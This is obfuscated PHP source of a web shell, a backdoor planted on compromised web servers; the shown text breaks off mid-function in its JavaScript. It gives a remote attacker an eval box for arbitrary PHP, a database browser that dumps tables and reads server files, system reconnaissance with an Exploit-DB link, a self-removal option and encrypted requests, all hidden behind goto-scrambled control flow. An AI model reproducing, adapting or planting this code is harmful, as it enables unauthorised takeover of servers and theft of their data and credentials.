  <?php
    if (!isset($_POST['lynx'])) {
        goto rJvuU;
        wviNQ:
        if (!$safe_mode) {
            error_reporting(0);
        }
        goto a9ZAj;
        ahbp0:
        function actionPhp()
        {
            goto CxwCi;
            okJ8S:
            YCSzmHeader();
            goto CWlq6;
            mN3ie:
            echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea><input type=submit value=Eval style="margin-top:5px">';
            goto lVhrp;
            lVhrp:
            echo ' <input type=checkbox name=ajax value=1 ' . ($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX</form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>';
            goto CtO7I;
            w3bRN:
            if (empty($_POST['ajax']) && !empty($_POST['p1'])) {
                $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
            }
            goto mN3ie;
            d3rBF:
            YCSzmFooter();
            goto mynLu;
            CxwCi:
            if (isset($_POST['ajax'])) {
                goto E0N9v;
                E0N9v:
                $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
                goto RFume;
                Rm5SZ:
                exit;
                goto Omgl_;
                IcZtG:
                $temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
                goto jYulm;
                boJ_E:
                eval($_POST['p1']);
                goto IcZtG;
                jYulm:
                echo strlen($temp), "\n", $temp;
                goto Rm5SZ;
                RFume:
                ob_start();
                goto boJ_E;
                Omgl_:
            }
            goto okJ8S;
            U3fWd:
            echo '</pre></div>';
            goto d3rBF;
            CWlq6:
            if (isset($_POST['p2']) && $_POST['p2'] == 'info') {
                goto Bbvcw;
                OmNAV:
                $tmp = preg_replace('!td, th {(.*)}!msiU', '.e, .v, .h, .h th {$1}', $tmp);
                goto b05Jg;
                pCfJ1:
                phpinfo();
                goto axOmW;
                NsmlV:
                echo '</div><br>';
                goto Ip56F;
                axOmW:
                $tmp = ob_get_clean();
                goto CQjsQ;
                ONiLA:
                $tmp = preg_replace('!a:\\w+ {.*}!msiU', '', $tmp);
                goto rkrqC;
                TtEdE:
                ob_start();
                goto pCfJ1;
                Bbvcw:
                echo '<h1>PHP info</h1><div class=content>';
                goto TtEdE;
                b05Jg:
                $tmp = preg_replace('!body, td, th, h2, h2 {.*}!msiU', '', $tmp);
                goto U5oaS;
                CQjsQ:
                $tmp = preg_replace('!body {.*}!msiU', '', $tmp);
                goto ONiLA;
                U5oaS:
                echo $tmp;
                goto NsmlV;
                rkrqC:
                $tmp = preg_replace('!h1!msiU', 'h2', $tmp);
                goto OmNAV;
                Ip56F:
            }
            goto w3bRN;
            CtO7I:
            if (!empty($_POST['p1'])) {
                goto X6S5j;
                mkRLP:
                echo htmlspecialchars(ob_get_clean());
                goto Ns4HK;
                yjWdJ:
                eval($_POST['p1']);
                goto mkRLP;
                X6S5j:
                ob_start();
                goto yjWdJ;
                Ns4HK:
            }
            goto U3fWd;
            mynLu:
        }
        goto iB0Kp;
        Y87Rk:
        function actionSql()
        {
            goto ZV6ws;
            ppMSJ:
            $db = new DbClass($_POST['type']);
            goto FB1S0;
            J0ZTx:
            $tmp = "<input type=text name=sql_base value=''>";
            goto o_ly4;
            K7qHY:
            echo ">MySql</option><option value='pgsql' ";
            goto NWPU1;
            qC9dT:
            echo "</td>\r\n\t\t\t\t<td><input type=submit value='submit' onclick='fs(d.sf);'></td>\r\n                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count']) ? '' : ' checked') . "> count the number of rows</td>\r\n\t\t\t</tr>\r\n\t\t</table>\r\n\t\t<script>\r\n            s_db='" . @addslashes($_POST['sql_base']) . "';\r\n            function fs(f) {\r\n                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};\r\n                    if(f.p1) f.p1.value='';\r\n                    if(f.p2) f.p2.value='';\r\n                    if(f.p3) f.p3.value='';\r\n                }\r\n            }\r\n\t\t\tfunction st(t,l) {\r\n\t\t\t\td.sf.p1.value = 'select';\r\n\t\t\t\td.sf.p2.value = t;\r\n                if(l && d.sf.p3) d.sf.p3.value = l;\r\n\t\t\t\td.sf.submit();\r\n\t\t\t}\r\n\t\t\tfunction is() {\r\n\t\t\t\tfor(i=0;i<d.sf.elements['tbl[]'].length;++i)\r\n\t\t\t\t\td.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;\r\n\t\t\t}\r\n\t\t</script>";
            goto ZYH5Q;
            NWPU1:
            if (@$_POST['type'] == 'pgsql') {
                echo 'selected';
            }
            goto GHN4V;
            rEZ16:
            echo '</div>';
            goto bZRp5;
            TFlNt:
            YCSzmHeader();
            goto pAk6p;
            o_ly4:
            if (isset($_POST['sql_host'])) {
                if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
                    goto AL8oJ;
                    kzKRg:
                    echo '</select></label>';
                    goto fuDrp;
                    zLA3G:
                    $db->listDbs();
                    goto h7wz1;
                    hZprs:
                    while ($▟ = $db->fetch()) {
                        list($key, $value) = each($▟);
                        echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
                    }
                    goto kzKRg;
                    h7wz1:
                    echo "<label><select name=sql_base><option value=''></option>";
                    goto hZprs;
                    AL8oJ:
                    switch ($_POST['charset']) {
                        case "Windows-1251":
                            $db->setCharset('cp1251');
                            break;
                        case "UTF-8":
                            $db->setCharset('utf8');
                            break;
                        case "KOI8-R":
                            $db->setCharset('koi8r');
                            break;
                        case "KOI8-U":
                            $db->setCharset('koi8u');
                            break;
                        case "cp866":
                            $db->setCharset('cp866');
                            break;
                    }
                    goto zLA3G;
                    fuDrp:
                } else {
                    echo $tmp;
                }
            } else {
                echo $tmp;
            }
            goto qC9dT;
            V2ZkY:
            if (@$_POST['type'] == 'mysql') {
                echo 'selected';
            }
            goto K7qHY;
            FB1S0:
            if (@$_POST['p2'] == 'download' && @$_POST['p1'] != 'select') {
                goto hqvmM;
                deSZ4:
                switch ($_POST['charset']) {
                    case "Windows-1251":
                        $db->setCharset('cp1251');
                        break;
                    case "UTF-8":
                        $db->setCharset('utf8');
                        break;
                    case "KOI8-R":
                        $db->setCharset('koi8r');
                        break;
                    case "KOI8-U":
                        $db->setCharset('koi8u');
                        break;
                    case "cp866":
                        $db->setCharset('cp866');
                        break;
                }
                goto V98M_;
                V98M_:
                if (empty($_POST['file'])) {
                    goto FEt3j;
                    V9Iyn:
                    exit;
                    goto RLesV;
                    l9DES:
                    foreach ($_POST['tbl'] as $v) {
                        $db->dump($v);
                    }
                    goto V9Iyn;
                    BvW_J:
                    header("Content-Disposition: attachment; filename=dump.sql");
                    goto IeFls;
                    IeFls:
                    header("Content-Type: text/plain");
                    goto l9DES;
                    FEt3j:
                    ob_start("ob_gzhandler", 4096);
                    goto BvW_J;
                    RLesV:
                } elseif ($fp = @fopen($_POST['file'], 'w')) {
                    goto Av_Sd;
                    Av_Sd:
                    foreach ($_POST['tbl'] as $v) {
                        $db->dump($v, $fp);
                    }
                    goto IJfLy;
                    IJfLy:
                    fclose($fp);
                    goto MEfRB;
                    MEfRB:
                    unset($_POST['p2']);
                    goto kvTI7;
                    kvTI7:
                } else {
                    die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
                }
                goto BLqUi;
                FGNXF:
                $db->selectdb($_POST['sql_base']);
                goto deSZ4;
                hqvmM:
                $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
                goto FGNXF;
                BLqUi:
            }
            goto TFlNt;
            ZV6ws:
            class DbClass
            {
                var $type;
                var $link;
                var $res;
                function __Constructor($type)
                {
                    $this->type = $type;
                }
                function connect($host, $user, $pass, $dbname)
                {
                    switch ($this->type) {
                        case 'mysql':
                            if ($this->link = @mysql_connect($host, $user, $pass, true)) {
                                return true;
                            }
                            break;
                        case 'pgsql':
                            goto umoUX;
                            umoUX:
                            $host = explode(':', $host);
                            goto DjWgD;
                            DjWgD:
                            if (!$host[1]) {
                                $host[1] = 5432;
                            }
                            goto dBuc_;
                            cZANs:
                            break;
                            goto SAMJQ;
                            dBuc_:
                            if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user={$user} password={$pass} dbname={$dbname}")) {
                                return true;
                            }
                            goto cZANs;
                            SAMJQ:
                    }
                    return false;
                }
                function selectdb($db)
                {
                    switch ($this->type) {
                        case 'mysql':
                            if (@mysql_select_db($db)) {
                                return true;
                            }
                            break;
                    }
                    return false;
                }
                function query($str)
                {
                    switch ($this->type) {
                        case 'mysql':
                            return $this->res = @mysql_query($str);
                            break;
                        case 'pgsql':
                            return $this->res = @pg_query($this->link, $str);
                            break;
                    }
                    return false;
                }
                function fetch()
                {
                    goto uVWUQ;
                    tNqx6:
                    switch ($this->type) {
                        case 'mysql':
                            return @mysql_fetch_assoc($res);
                            break;
                        case 'pgsql':
                            return @pg_fetch_assoc($res);
                            break;
                    }
                    goto ecOUy;
                    uVWUQ:
                    $res = func_num_args() ? func_get_arg(0) : $this->res;
                    goto tNqx6;
                    ecOUy:
                    return false;
                    goto qiFKy;
                    qiFKy:
                }
                function listDbs()
                {
                    switch ($this->type) {
                        case 'mysql':
                            return $this->query("SHOW databases");
                            break;
                        case 'pgsql':
                            return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
                            break;
                    }
                    return false;
                }
                function listTables()
                {
                    switch ($this->type) {
                        case 'mysql':
                            return $this->res = $this->query('SHOW TABLES');
                            break;
                        case 'pgsql':
                            return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
                            break;
                    }
                    return false;
                }
                function error()
                {
                    switch ($this->type) {
                        case 'mysql':
                            return @mysql_error();
                            break;
                        case 'pgsql':
                            return @pg_last_error();
                            break;
                    }
                    return false;
                }
                function setCharset($str)
                {
                    switch ($this->type) {
                        case 'mysql':
                            if (function_exists('mysql_set_charset')) {
                                return @mysql_set_charset($str, $this->link);
                            } else {
                                $this->query('SET CHARSET ' . $str);
                            }
                            break;
                        case 'pgsql':
                            return @pg_set_client_encoding($this->link, $str);
                            break;
                    }
                    return false;
                }
                function loadFile($str)
                {
                    switch ($this->type) {
                        case 'mysql':
                            return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file"));
                            break;
                        case 'pgsql':
                            goto B7uXh;
                            B7uXh:
                            $this->query("CREATE TABLE YCSzm2(file text);COPY YCSzm2 FROM '" . addslashes($str) . "';select file from YCSzm2;");
                            goto IC0RW;
                            MfqvX:
                            break;
                            goto BAPYU;
                            wnVKC:
                            return array('file' => implode("\n", $r));
                            goto MfqvX;
                            HCLQs:
                            while ($i = $this->fetch()) {
                                $r[] = $i['file'];
                            }
                            goto SkZ3U;
                            SkZ3U:
                            $this->query('drop table YCSzm2');
                            goto wnVKC;
                            IC0RW:
                            $r = array();
                            goto HCLQs;
                            BAPYU:
                    }
                    return false;
                }
                function dump($table, $fp = false)
                {
                    switch ($this->type) {
                        case 'mysql':
                            goto A5wrh;
                            A5wrh:
                            $res = $this->query('SHOW CREATE TABLE `' . $table . '`');
                            goto tVDEK;
                            tVDEK:
                            $create = mysql_fetch_array($res);
                            goto sI9T3;
                            QGIJd:
                            while ($▟ = $this->fetch()) {
                                $sql = '';
                                if ($i % 1000 == 0) {
                                    $head = true;
                                    $sql = ";\n\n";
                                }
                                $columns = array();
                                foreach ($▟ as $k => $v) {
                                    if ($v === null) {
                                        $▟[$k] = "NULL";
                                    } elseif (is_int($v)) {
                                        $▟[$k] = $v;
                                    } else {
                                        $▟[$k] = "'" . @mysql_real_escape_string($v) . "'";
                                    }
                                    $columns[] = "`" . $k . "`";
                                }
                                if ($head) {
                                    $sql .= 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ") VALUES \n\t(" . implode(", ", $▟) . ')';
                                    $head = false;
                                } else {
                                    $sql .= "\n\t,(" . implode(", ", $▟) . ')';
                                }
                                if ($fp) {
                                    fwrite($fp, $sql);
                                } else {
                                    echo $sql;
                                }
                                $i++;
                            }
                            goto P1Vtn;
                            yzgLS:
                            break;
                            goto WKj7Y;
                            i07ro:
                            $this->query('SELECT * FROM `' . $table . '`');
                            goto KN0fB;
                            KN0fB:
                            $i = 0;
                            goto cIQyb;
                            cIQyb:
                            $head = true;
                            goto QGIJd;
                            P1Vtn:
                            if (!$head) {
                                if ($fp) {
                                    fwrite($fp, ";\n\n");
                                } else {
                                    echo ";\n\n";
                                }
                            }
                            goto yzgLS;
                            b2aVT:
                            if ($fp) {
                                fwrite($fp, $sql);
                            } else {
                                echo $sql;
                            }
                            goto i07ro;
                            sI9T3:
                            $sql = $create[1] . ";\n";
                            goto b2aVT;
                            WKj7Y:
                        case 'pgsql':
                            goto tuHZU;
                            hr7r7:
                            break;
                            goto G8SVj;
                            JPhx_:
                            while ($▟ = $this->fetch()) {
                                $columns = array();
                                foreach ($▟ as $k => $v) {
                                    $▟[$k] = "'" . addslashes($v) . "'";
                                    $columns[] = $k;
                                }
                                $sql = 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $▟) . ');' . "\n";
                                if ($fp) {
                                    fwrite($fp, $sql);
                                } else {
                                    echo $sql;
                                }
                            }
                            goto hr7r7;
                            tuHZU:
                            $this->query('SELECT * FROM ' . $table);
                            goto JPhx_;
                            G8SVj:
                    }
                    return false;
                }
            }
            goto ppMSJ;
            GHN4V:
            echo ">PostgreSql</option></select></label></td>\r\n<td><input type=text name=sql_host value=\"" . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . "\"></td>\r\n<td><input type=text name=sql_login value=\"" . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . "\"></td>\r\n<td><input type=text name=sql_pass value=\"" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "\" required></td><td>";
            goto J0ZTx;
            pAk6p:
            echo "\r\n<h1>Sql browser</h1><div class=content>\r\n<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>\r\n<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>\r\n<input type=hidden name=ne value=''><input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>\r\n<td><label><select name='type'><option value='mysql' ";
            goto V2ZkY;
            bZRp5:
            YCSzmFooter();
            goto q4BYi;
            ZYH5Q:
            if (isset($db) && $db->link) {
                goto qr9vq;
                LMixH:
                echo "</table></form><br/>";
                goto We5p2;
                nXVyf:
                if (!empty($_POST['sql_base'])) {
                    goto HyMnG;
                    F0kI_:
                    if (!empty($_POST['p2']) && $_POST['p1'] != 'loadfile') {
                        echo htmlspecialchars($_POST['p2']);
                    }
                    goto CshES;
                    tHNAC:
                    if (@$_POST['p1'] == 'select') {
                        goto h9YSn;
                        Ng6fK:
                        $pages = ceil($num['n'] / 30);
                        goto gcclq;
                        h9YSn:
                        $_POST['p1'] = 'query';
                        goto LGIH1;
                        zckae:
                        echo "<br><br>";
                        goto nATyT;
                        LGIH1:
                        $_POST['p3'] = $_POST['p3'] ? $_POST['p3'] : 1;
                        goto UHAOB;
                        TH73v:
                        if ($_POST['p3'] < $pages) {
                            echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ")'>Next &gt;</a>";
                        }
                        goto Pbc5h;
                        gcclq:
                        echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>" . $_POST['p2'] . "</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . (int) $_POST['p3'] . ">";
                        goto P9USt;
                        UHAOB:
                        $db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
                        goto xg1OX;
                        ipY2p:
                        if ($_POST['p3'] > 1) {
                            echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ")'>&lt; Prev</a>";
                        }
                        goto TH73v;
                        Pbc5h:
                        $_POST['p3']--;
                        goto gIU2f;
                        P9USt:
                        echo " of {$pages}";
                        goto ipY2p;
                        gIU2f:
                        if ($_POST['type'] == 'pgsql') {
                            $_POST['p2'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . $_POST['p3'] * 30;
                        } else {
                            $_POST['p2'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . $_POST['p3'] * 30 . ',30';
                        }
                        goto zckae;
                        xg1OX:
                        $num = $db->fetch();
                        goto Ng6fK;
                        nATyT:
                    }
                    goto uV58W;
                    xMh2b:
                    $tbls_res = $db->listTables();
                    goto klJqZ;
                    CshES:
                    echo "</textarea><br/><input type=submit value='Execute'>";
                    goto CdSpe;
                    CdSpe:
                    echo "</td></tr>";
                    goto yPpgu;
                    Xy3zW:
                    echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
                    goto xMh2b;
                    sGzJE:
                    echo "<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
                    goto tHNAC;
                    klJqZ:
                    while ($▟ = $db->fetch($tbls_res)) {
                        list($key, $value) = each($▟);
                        if (!empty($_POST['sql_count'])) {
                            $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));
                        }
                        $value = htmlspecialchars($value);
                        echo "<nobr><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a href=# onclick=\"st('" . $value . "',1)\">" . $value . "</a>" . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$n['n']})</small>") . "</nobr><br>";
                    }
                    goto sGzJE;
                    HyMnG:
                    $db->selectdb($_POST['sql_base']);
                    goto Xy3zW;
                    gMlWr:
                    echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
                    goto F0kI_;
                    uV58W:
                    if (@$_POST['p1'] == 'query' && !empty($_POST['p2'])) {
                        $db->query(@$_POST['p2']);
                        if ($db->res !== false) {
                            goto rW9pX;
                            gzsV9:
                            echo '<table width=100% cellspacing=1 cellpadding=2 class=main>';
                            goto jT1n3;
                            jT1n3:
                            $line = 1;
                            goto I66qi;
                            I66qi:
                            while ($▟ = $db->fetch()) {
                                if (!$title) {
                                    goto CF1oc;
                                    XcLYn:
                                    $title = true;
                                    goto P1jKr;
                                    P1jKr:
                                    echo '</tr><tr>';
                                    goto Bgh_J;
                                    Bgh_J:
                                    $line = 2;
                                    goto jUpvp;
                                    CF1oc:
                                    echo '<tr>';
                                    goto tYo2m;
                                    tYo2m:
                                    foreach ($▟ as $key => $value) {
                                        echo '<th>' . $key . '</th>';
                                    }
                                    goto bF1fq;
                                    bF1fq:
                                    reset($▟);
                                    goto XcLYn;
                                    jUpvp:
                                }
                                echo '<tr class="l' . $line . '">';
                                $line = $line == 1 ? 2 : 1;
                                foreach ($▟ as $key => $value) {
                                    if ($value == null) {
                                        echo '<td><i>null</i></td>';
                                    } else {
                                        echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';
                                    }
                                }
                                echo '</tr>';
                            }
                            goto SF_44;
                            rW9pX:
                            $title = false;
                            goto gzsV9;
                            SF_44:
                            echo '</table>';
                            goto XpnZm;
                            XpnZm:
                        } else {
                            echo '<div><b>Error:</b> ' . htmlspecialchars($db->error()) . '</div>';
                        }
                    }
                    goto gMlWr;
                    yPpgu:
                }
                goto LMixH;
                qr9vq:
                echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
                goto nXVyf;
                We5p2:
                if ($_POST['type'] == 'mysql') {
                    $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                    if ($db->fetch()) {
                        echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='submit'></form>";
                    }
                }
                goto Xlv8k;
                Xlv8k:
                if (@$_POST['p1'] == 'loadfile') {
                    $file = $db->loadFile($_POST['p2']);
                    echo '<br/><pre class=ml1>' . htmlspecialchars($file['file']) . '</pre>';
                }
                goto tav8v;
                tav8v:
            } else {
                echo htmlspecialchars($db->error());
            }
            goto rEZ16;
            q4BYi:
        }
        goto g2lf6;
        NfUGZ:
        function YCSzmHeader()
        {
            goto Uq93C;
            YXDvx:
            $kernel = @php_uname('s');
            goto uykzT;
            VhaxR:
            foreach ($charsets as $▟) {
                $opt_charsets .= '<option value="' . $▟ . '" ' . ($_POST['charset'] == $▟ ? 'selected' : '') . '>' . $▟ . '</option>';
            }
            goto q3j10;
            hu5EY:
            $m['Self remove'] = 'SelfRemove';
            goto mnAE6;
            SGUgU:
            for ($i = 0; $i < $n - 1; $i++) {
                $cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
                for ($j = 0; $j <= $i; $j++) {
                    $cwd_links .= $path[$j] . '/';
                }
                $cwd_links .= "\")'>" . $path[$i] . "/</a>";
            }
            goto LpYKY;
            mnAE6:
            $menu = '';
            goto ZcZ0E;
            nA9tI:
            $freeSpace = @diskfreespace($GLOBALS['cwd']);
            goto Q629j;
            PW1qQ:
            $cwd_links = '';
            goto KZLqM;
            ZcZ0E:
            foreach ($m as $k => $v) {
                $menu .= '<th>[ <a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\')">' . $k . '</a> ]</th>';
            }
            goto Al971;
            d4Lyc:
            if (!function_exists('posix_getegid')) {
                goto Dgvhr;
                GuK_g:
                $uid = @getmyuid();
                goto BJoh1;
                oKcmS:
                $group = "?";
                goto BH9IK;
                BJoh1:
                $gid = @getmygid();
                goto oKcmS;
                Dgvhr:
                $user = @get_current_user();
                goto GuK_g;
                BH9IK:
            } else {
                goto eybDi;
                JsHh3:
                $uid = $uid['uid'];
                goto teVLI;
                teVLI:
                $group = $gid['name'];
                goto F01vj;
                CmXfv:
                $user = $uid['name'];
                goto JsHh3;
                F01vj:
                $gid = $gid['gid'];
                goto wMppS;
                maN7M:
                $gid = @posix_getgrgid(@posix_getegid());
                goto CmXfv;
                eybDi:
                $uid = @posix_getpwuid(@posix_geteuid());
                goto maN7M;
                wMppS:
            }
            goto PW1qQ;
            KZLqM:
            $path = explode("/", $GLOBALS['cwd']);
            goto HkOyr;
            VDn1J:
            $release = @php_uname('r');
            goto YXDvx;
            OTrZW:
            $totalSpace = $totalSpace ? $totalSpace : 1;
            goto VDn1J;
            WezkY:
            echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win' ? '<br>Drives:' : '') . '</span></td>' . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="https://noreferer.de/?https://www.google.com/search?q=' . urlencode(@php_uname()) . '" target="_blank">[ Google ]</a> <a href="' . $explink . '" target=_blank>[ Exploit-DB ]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode'] ? '<font color=red>ON</font>' : '<font color=#FFDB5F><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . viewSize($totalSpace) . ' <span>Free:</span> ' . viewSize($freeSpace) . ' (' . round(100 / ($totalSpace / $freeSpace), 2) . '%)<br>' . $cwd_links . ' ' . viewPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>' . '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">' . $opt_charsets . '</select></label><br><span>Server IP:</span><br>' . gethostbyname($_SERVER["HTTP_HOST"]) . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>' . '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div>';
            goto qVuU0;
            VpmL6:
            if ($GLOBALS['os'] == 'win') {
                foreach (range('c', 'z') as $drive) {
                    if (is_dir($drive . ':\\')) {
                        $drives .= '<a href="#" onclick="g(\'FilesMan\',\'' . $drive . ':/\')">[ ' . $drive . ' ]</a> ';
                    }
                }
            }
            goto WezkY;
            e14XC:
            echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - " . VERSION . "</title>\r\n<style>\r\n\tbody {background-color:#444; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}\r\n\r\n\t#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}\r\n\tbody,td,th\t{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}\r\n\ttable.info\t{color: #fff;background-color: #222;}\r\n\ttable#toolsTbl {background-color: #222;}\r\n\tspan,h1,a\t{color:#df5 !important;}\r\n\tspan\t\t{font-weight:bolder;}\r\n\th1\t\t\t{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#222;margin:0px;}\r\n\tdiv.content\t{padding:5px;margin-left:5px;background-color:#060a10;}\r\n\ta\t\t\t{text-decoration:none;}\r\n\ta:hover\t\t{text-decoration:underline;}\r\n\t.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}\r\n\t.tooltip:hover::after {opacity:1;visibility:visible;}\r\n\t.ml1\t\t{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}\r\n\t.bigarea\t{min-width:100%;max-width:100%;height:400px;}\r\n\tinput, textarea, select\t{margin:0;color:#fff;background-color:#202832;border:solid 1px #df5;font:9pt Courier New;outline:none;}\r\n\tlabel {position:relative}\r\n\tlabel:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}\r\n\tlabel:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}\r\n\tform\t\t{margin:0px;}\r\n\t#toolsTbl\t{text-align:center;}\r\n\t#fak \t\t{background:none;}\r\n\t#fak td \t{padding:5px 0 0 0;}\r\n\tiframe\t\t{border:1px solid #060a10;}\r\n\t.toolsInp\t{width:300px}\r\n    .main th{text-align:left;background-color:#5e5e5e;}\r\n    .main tr:hover{background-color:#5e5e5e}\r\n\tinput[type='submit']{background-color:#2E6E9C;}\r\n\tinput[type='button']{background-color:#2E6E9C;}\r\n\tinput[type='submit']:hover{background-color:#56AD15;}\r\n\tinput[type='button']:hover{background-color:#56AD15;}\r\n\t.l2{background-color:#444}\r\n    .l1{background-color:#333}\r\n\tpre\t\t\t{font:9pt Courier New;}\r\n</style>\r\n<script>\r\n    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';\r\n    var a_ = '" . htmlspecialchars(@$_POST['a']) . "'\r\n    var charset_ = '" . htmlspecialchars(@$_POST['charset']) . "';\r\n    var p1_ = '" . (strpos(@$_POST['p1'], "\n") !== false ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . "';\r\n    var p2_ = '" . (strpos(@$_POST['p2'], "\n") !== false ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . "';\r\n    var p3_ = '" . (strpos(@$_POST['p3'], "\n") !== false ? '' : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . "';\r\n    var d = document;\r\n\t\r\n\tfunction encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}\r\n\tfunction utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}\r\n\tfunction base64_encode(data){var b64 = 